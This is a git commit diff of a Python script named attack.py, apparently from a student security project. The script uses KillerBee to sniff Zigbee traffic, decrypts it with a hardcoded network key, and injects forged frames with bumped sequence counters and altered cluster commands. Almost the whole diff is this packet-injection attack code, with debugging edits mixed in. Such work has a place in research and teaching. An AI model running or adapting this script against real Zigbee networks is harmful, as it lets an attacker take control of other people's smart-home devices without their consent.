391cefac8d434c1b7c4ac39c9cd96941fbb910e4
Jelmer <j.lap@student.tue.nl>
2022-06-17 09:01:08 -0400

    Modified attack

--- attack.py
+++ attack.py
@@ -10,7 +10,7 @@ args = parser.parse_args()
 
 key = bytes.fromhex("c7398de1956fbe125d3463a58f1e3a3c")
 
-pkts = kbrdpcap("strippedPackets.pcap")
+pkts = kbrdpcap("/home/kali/Downloads/test.pcap")
 
 def craftPacket(pkt, data):
     print(pkt.getlayer("Dot15d4FCS").seqnum)
@@ -19,26 +19,26 @@ def craftPacket(pkt, data):
     pkt.getlayer("ZigbeeNWK").seqnum += 1
     data.getlayer("ZigbeeAppDataPayload").counter += 1
     data.getlayer("ZigbeeClusterLibrary").transaction_sequence += 1
-    data.getlayer("ZigbeeClusterLibrary").command_identifier = 0x00
+    data.getlayer("ZigbeeClusterLibrary").command_identifier |= 0x00
     return kbencrypt(pkt, data, key)
 
 dev = KillerBee(device=kbutils.devlist()[0][0])
 
 while True:
     pkt = kbsniff(args.channel, iface=dev, count=1)
-    print(pkt)
+    pkt = pkts[0]
     pkt[0].show()
-    print("voor eerste if")
+    # print("voor eerste if")
     if pkt[0].haslayer("ZigbeeSecurityHeader"):
-        print("voor 2e if")
-        kbwrpcap("test.pcap", pkt)
+        # print("voor 2e if")
+        # kbwrpcap("test.pcap", pkt)
         dec = kbdecrypt(pkt[0], key)
         dec.show()
 
-        if dec.haslayer("ZigbeeClusterLibrary") and dec.getlayer("ZigbeeClusterLibrary").command_identifier == 0x01: 
-            print(1234 + "HIERO")
+        if (dec.haslayer("ZigbeeClusterLibrary")) and (dec.getlayer("ZigbeeClusterLibrary").command_identifier == 0 or dec.getlayer("ZigbeeClusterLibrary").command_identifier == 1): 
+            print("Decrypted if")
             newPkt = craftPacket(pkt, dec)
-            print("New packet")
+            # print("New packet")
             newPkt.show()
             kbsendp(newPkt, args.channel)
 
